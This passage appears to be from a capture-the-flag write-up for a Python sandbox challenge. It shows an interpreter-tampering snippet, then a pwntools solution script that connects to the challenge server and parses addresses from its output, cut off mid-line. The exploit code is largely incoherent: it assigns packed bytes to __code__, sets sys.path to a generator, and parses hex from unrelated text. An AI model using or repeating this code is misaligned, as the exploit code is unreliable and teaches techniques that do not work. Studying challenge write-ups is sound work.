fn = lambda: None
gi = (i for i in ())
fn.__code__ = struct.pack("L", 0x0)
gi.gi_frame.f_locals["__class__"] = fn
sys.path = gi
logging.critical("PWNT!")
```

### Solution

Write the following to `exploit.py` to solve the challenge:

```python
from pwn import *

# start
conn = remote(
    "2020.redpwnc.tf",
    31744
)

# read the source from the challenge
conn.recvuntil("Send your exploit to this actually-useful endpoint:")
source = conn.recvline().decode("utf-8")[:-1]

# get the address of the code for a lambda function
address = source[source.find("lambda: None"):].find("fn = ") + source.find("lambda: None") + len("fn = ")
address = int(
    source[address:address + 10],
    16
)

# get the address of the code for the generator
address2 = source[source.find("gi = (i for i in
